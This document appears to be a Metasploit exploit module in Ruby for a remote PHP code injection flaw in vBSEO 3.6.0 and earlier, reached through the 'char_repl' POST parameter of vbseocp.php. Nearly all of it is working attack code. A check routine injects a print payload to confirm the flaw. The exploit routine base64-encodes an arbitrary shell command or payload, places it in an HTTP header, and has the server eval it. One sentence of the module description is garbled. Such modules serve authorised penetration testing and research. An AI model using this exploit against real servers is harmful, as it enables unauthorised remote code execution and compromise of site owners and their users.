class Metasploit3 < Msf::Exploit::Remote
    include Msf::Exploit::Remote::HttpClient
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;vBSEO <= 3.6.0 "proc_deutf()" Remote PHP Code Injection&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in the &#039;proc_deutf()&#039; function
                defined in /includes/functions_vbseocp_abstract.php. User input passed through
                &#039;char_repl&#039; POST parameter isn&#039;t properly sanitized before being used in a call
                inject and execute arbitrary code leveraging the PHP&#039;s complex curly syntax.
            },
            &#039;Author&#039;         => &#039;EgiX <n0b0d13s[at]gmail.com>&#039;, # originally reported by the vendor
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;BID&#039;, &#039;51647&#039;],
                    [&#039;URL&#039;, &#039;http://www.vbseo.com/f5/vbseo-security-bulletin-all-supported-versions-patch-release-52783/&#039;],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Space&#039;       => 8190,
                    &#039;Keys&#039;        => [&#039;php&#039;],
                },
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Jan 23 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
            register_options(
                [
                    OptString.new(&#039;URI&#039;, [true, "The full URI path to vBulletin", "/vb/"]),
                ], self.class)
    end
    def check
        flag = rand_text_alpha(rand(10)+10)
        data = "char_repl=&#039;{${print(#{flag})}}&#039;=>"
        uri = &#039;&#039;
        uri << datastore[&#039;URI&#039;]
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        uri << &#039;vbseocp.php&#039;
        response = send_request_cgi({
            &#039;method&#039; => "POST",
            &#039;uri&#039; => uri,
            &#039;data&#039; => "#{data}"
        })
        if response.code == 200 and response.body =~ /#{flag}/
            return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end
    def exploit
        if datastore[&#039;CMD&#039;]
            p = "passthru(\"%s\");" % datastore[&#039;CMD&#039;]
            p = Rex::Text.encode_base64(p)
        else
            p = Rex::Text.encode_base64(payload.encoded)
        end
        data = "char_repl=&#039;{${eval(base64_decode($_SERVER[HTTP_CODE]))}}.{${die()}}&#039;=>"
        uri = &#039;&#039;
        uri << datastore[&#039;URI&#039;]
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        uri << &#039;vbseocp.php&#039;
        response = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039; => uri,
            &#039;data&#039; => data,
            &#039;headers&#039; => { &#039;Code&#039; => p }
        })
        print_status("%s" % response.body) if datastore[&#039;CMD&#039;]
    end
end



